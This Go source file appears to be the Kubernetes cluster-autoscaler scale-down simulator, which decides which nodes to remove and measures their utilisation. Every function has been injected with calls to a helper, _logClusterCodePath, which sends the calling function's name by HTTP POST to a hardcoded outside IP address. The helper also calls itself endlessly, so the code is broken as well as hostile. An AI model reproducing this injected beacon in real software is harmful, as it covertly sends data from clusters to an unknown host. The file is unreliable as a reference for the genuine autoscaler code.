package simulator

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"math"
	"math/rand"
	"time"
	"k8s.io/autoscaler/cluster-autoscaler/utils/drain"
	"k8s.io/autoscaler/cluster-autoscaler/utils/errors"
	"k8s.io/autoscaler/cluster-autoscaler/utils/glogx"
	scheduler_util "k8s.io/autoscaler/cluster-autoscaler/utils/scheduler"
	"k8s.io/autoscaler/cluster-autoscaler/utils/tpu"
	apiv1 "k8s.io/api/core/v1"
	policyv1 "k8s.io/api/policy/v1beta1"
	"k8s.io/apimachinery/pkg/api/resource"
	client "k8s.io/client-go/kubernetes"
	"k8s.io/kubernetes/pkg/scheduler/algorithm"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
	"k8s.io/klog"
)

var (
	skipNodesWithSystemPods		= flag.Bool("skip-nodes-with-system-pods", true, "If true cluster autoscaler will never delete nodes with pods from kube-system (except for DaemonSet "+"or mirror pods)")
	skipNodesWithLocalStorage	= flag.Bool("skip-nodes-with-local-storage", true, "If true cluster autoscaler will never delete nodes with pods with local storage, e.g. EmptyDir or HostPath")
	minReplicaCount			= flag.Int("min-replica-count", 0, "Minimum number or replicas that a replica set or replication controller should have to allow their pods deletion in scale down")
)

type NodeToBeRemoved struct {
	Node			*apiv1.Node
	PodsToReschedule	[]*apiv1.Pod
}
type UtilizationInfo struct {
	CpuUtil		float64
	MemUtil		float64
	Utilization	float64
}

func FindNodesToRemove(candidates []*apiv1.Node, allNodes []*apiv1.Node, pods []*apiv1.Pod, client client.Interface, predicateChecker *PredicateChecker, maxCount int, fastCheck bool, oldHints map[string]string, usageTracker *UsageTracker, timestamp time.Time, podDisruptionBudgets []*policyv1.PodDisruptionBudget) (nodesToRemove []NodeToBeRemoved, unremovableNodes []*apiv1.Node, podReschedulingHints map[string]string, finalError errors.AutoscalerError) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeNameToNodeInfo := scheduler_util.CreateNodeNameToInfoMap(pods, allNodes)
	result := make([]NodeToBeRemoved, 0)
	unremovable := make([]*apiv1.Node, 0)
	evaluationType := "Detailed evaluation"
	if fastCheck {
		evaluationType = "Fast evaluation"
	}
	newHints := make(map[string]string, len(oldHints))
candidateloop:
	for _, node := range candidates {
		klog.V(2).Infof("%s: %s for removal", evaluationType, node.Name)
		var podsToRemove []*apiv1.Pod
		var err error
		if nodeInfo, found := nodeNameToNodeInfo[node.Name]; found {
			if fastCheck {
				podsToRemove, err = FastGetPodsToMove(nodeInfo, *skipNodesWithSystemPods, *skipNodesWithLocalStorage, podDisruptionBudgets)
			} else {
				podsToRemove, err = DetailedGetPodsForMove(nodeInfo, *skipNodesWithSystemPods, *skipNodesWithLocalStorage, client, int32(*minReplicaCount), podDisruptionBudgets)
			}
			if err != nil {
				klog.V(2).Infof("%s: node %s cannot be removed: %v", evaluationType, node.Name, err)
				unremovable = append(unremovable, node)
				continue candidateloop
			}
		} else {
			klog.V(2).Infof("%s: nodeInfo for %s not found", evaluationType, node.Name)
			unremovable = append(unremovable, node)
			continue candidateloop
		}
		findProblems := findPlaceFor(node.Name, podsToRemove, allNodes, nodeNameToNodeInfo, predicateChecker, oldHints, newHints, usageTracker, timestamp)
		if findProblems == nil {
			result = append(result, NodeToBeRemoved{Node: node, PodsToReschedule: podsToRemove})
			klog.V(2).Infof("%s: node %s may be removed", evaluationType, node.Name)
			if len(result) >= maxCount {
				break candidateloop
			}
		} else {
			klog.V(2).Infof("%s: node %s is not suitable for removal: %v", evaluationType, node.Name, findProblems)
			unremovable = append(unremovable, node)
		}
	}
	return result, unremovable, newHints, nil
}
func FindEmptyNodesToRemove(candidates []*apiv1.Node, pods []*apiv1.Pod) []*apiv1.Node {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeNameToNodeInfo := scheduler_util.CreateNodeNameToInfoMap(pods, candidates)
	result := make([]*apiv1.Node, 0)
	for _, node := range candidates {
		if nodeInfo, found := nodeNameToNodeInfo[node.Name]; found {
			podsToRemove, err := FastGetPodsToMove(nodeInfo, true, true, nil)
			if err == nil && len(podsToRemove) == 0 {
				result = append(result, node)
			}
		} else {
			result = append(result, node)
		}
	}
	return result
}
func CalculateUtilization(node *apiv1.Node, nodeInfo *schedulercache.NodeInfo, skipDaemonSetPods, skipMirrorPods bool) (utilInfo UtilizationInfo, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cpu, err := calculateUtilizationOfResource(node, nodeInfo, apiv1.ResourceCPU, skipDaemonSetPods, skipMirrorPods)
	if err != nil {
		return UtilizationInfo{}, err
	}
	mem, err := calculateUtilizationOfResource(node, nodeInfo, apiv1.ResourceMemory, skipDaemonSetPods, skipMirrorPods)
	if err != nil {
		return UtilizationInfo{}, err
	}
	return UtilizationInfo{CpuUtil: cpu, MemUtil: mem, Utilization: math.Max(cpu, mem)}, nil
}
func calculateUtilizationOfResource(node *apiv1.Node, nodeInfo *schedulercache.NodeInfo, resourceName apiv1.ResourceName, skipDaemonSetPods, skipMirrorPods bool) (float64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeAllocatable, found := node.Status.Allocatable[resourceName]
	if !found {
		return 0, fmt.Errorf("Failed to get %v from %s", resourceName, node.Name)
	}
	if nodeAllocatable.MilliValue() == 0 {
		return 0, fmt.Errorf("%v is 0 at %s", resourceName, node.Name)
	}
	podsRequest := resource.MustParse("0")
	for _, pod := range nodeInfo.Pods() {
		if skipDaemonSetPods && isDaemonSet(pod) {
			continue
		}
		if skipMirrorPods && drain.IsMirrorPod(pod) {
			continue
		}
		for _, container := range pod.Spec.Containers {
			if resourceValue, found := container.Resources.Requests[resourceName]; found {
				podsRequest.Add(resourceValue)
			}
		}
	}
	return float64(podsRequest.MilliValue()) / float64(nodeAllocatable.MilliValue()), nil
}
func findPlaceFor(removedNode string, pods []*apiv1.Pod, nodes []*apiv1.Node, nodeInfos map[string]*schedulercache.NodeInfo, predicateChecker *PredicateChecker, oldHints map[string]string, newHints map[string]string, usageTracker *UsageTracker, timestamp time.Time) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newNodeInfos := make(map[string]*schedulercache.NodeInfo)
	for k, v := range nodeInfos {
		newNodeInfos[k] = v
	}
	podKey := func(pod *apiv1.Pod) string {
		return fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)
	}
	loggingQuota := glogx.PodsLoggingQuota()
	tryNodeForPod := func(nodename string, pod *apiv1.Pod, predicateMeta algorithm.PredicateMetadata) bool {
		nodeInfo, found := newNodeInfos[nodename]
		if found {
			if nodeInfo.Node() == nil {
				klog.Warningf("No node in nodeInfo %s -> %v", nodename, nodeInfo)
				return false
			}
			err := predicateChecker.CheckPredicates(pod, predicateMeta, nodeInfo)
			if err != nil {
				glogx.V(4).UpTo(loggingQuota).Infof("Evaluation %s for %s/%s -> %v", nodename, pod.Namespace, pod.Name, err.VerboseError())
			} else {
				klog.V(4).Infof("Pod %s/%s can be moved to %s", pod.Namespace, pod.Name, nodename)
				podsOnNode := nodeInfo.Pods()
				podsOnNode = append(podsOnNode, pod)
				newNodeInfo := schedulercache.NewNodeInfo(podsOnNode...)
				newNodeInfo.SetNode(nodeInfo.Node())
				newNodeInfos[nodename] = newNodeInfo
				newHints[podKey(pod)] = nodename
				return true
			}
		}
		return false
	}
	shuffledNodes := shuffleNodes(nodes)
	pods = tpu.ClearTPURequests(pods)
	for _, podptr := range pods {
		newpod := *podptr
		newpod.Spec.NodeName = ""
		pod := &newpod
		foundPlace := false
		targetNode := ""
		predicateMeta := predicateChecker.GetPredicateMetadata(pod, newNodeInfos)
		loggingQuota.Reset()
		klog.V(5).Infof("Looking for place for %s/%s", pod.Namespace, pod.Name)
		hintedNode, hasHint := oldHints[podKey(pod)]
		if hasHint {
			if hintedNode != removedNode && tryNodeForPod(hintedNode, pod, predicateMeta) {
				foundPlace = true
				targetNode = hintedNode
			}
		}
		if !foundPlace {
			for _, node := range shuffledNodes {
				if node.Name == removedNode {
					continue
				}
				if tryNodeForPod(node.Name, pod, predicateMeta) {
					foundPlace = true
					targetNode = node.Name
					break
				}
			}
			if !foundPlace {
				glogx.V(4).Over(loggingQuota).Infof("%v other nodes evaluated for %s/%s", -loggingQuota.Left(), pod.Namespace, pod.Name)
				return fmt.Errorf("failed to find place for %s", podKey(pod))
			}
		}
		usageTracker.RegisterUsage(removedNode, targetNode, timestamp)
	}
	return nil
}
func shuffleNodes(nodes []*apiv1.Node) []*apiv1.Node {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make([]*apiv1.Node, len(nodes))
	for i := range nodes {
		result[i] = nodes[i]
	}
	for i := range result {
		j := rand.Intn(len(result))
		result[i], result[j] = result[j], result[i]
	}
	return result
}
func isDaemonSet(pod *apiv1.Pod) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, ownerReference := range pod.ObjectMeta.OwnerReferences {
		if ownerReference.Kind == "DaemonSet" {
			return true
		}
	}
	return false
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
